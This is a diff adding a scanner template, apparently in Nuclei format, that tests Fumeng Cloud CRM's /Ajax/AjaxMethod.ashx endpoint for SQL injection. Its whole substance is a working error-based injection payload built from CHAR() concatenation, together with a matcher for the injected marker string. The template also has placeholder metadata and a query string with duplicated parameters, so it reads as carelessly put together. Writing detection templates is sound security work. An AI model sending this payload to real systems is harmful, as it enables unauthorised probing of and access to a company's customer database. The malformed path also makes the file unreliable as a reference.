@@ -1,0 +1,18 @@
+id: fumeng-AjaxMethod-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 孚盟云-CRM系统-SQL
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/F10-1%E5%AD%9A%E7%9B%9F%E4%BA%91-CRM%E7%B3%BB%E7%BB%9F-SQL?id=f10-1%e5%ad%9a%e7%9b%9f%e4%ba%91-crm%e7%b3%bb%e7%bb%9f-sql
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=1action=getEmpByname&Name=1'+AND+5202+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(98)%2bCHAR(106)%2bCHAR(113)%2b(SELECT+(CASE+WHEN+(5202%3d5202)+THEN+CHAR(49)+ELSE+CHAR(48)+END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(113)%2bCHAR(112)%2bCHAR(113)))+AND+'WMgg'%3d'WMgg"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qxbjq1qxqpq'
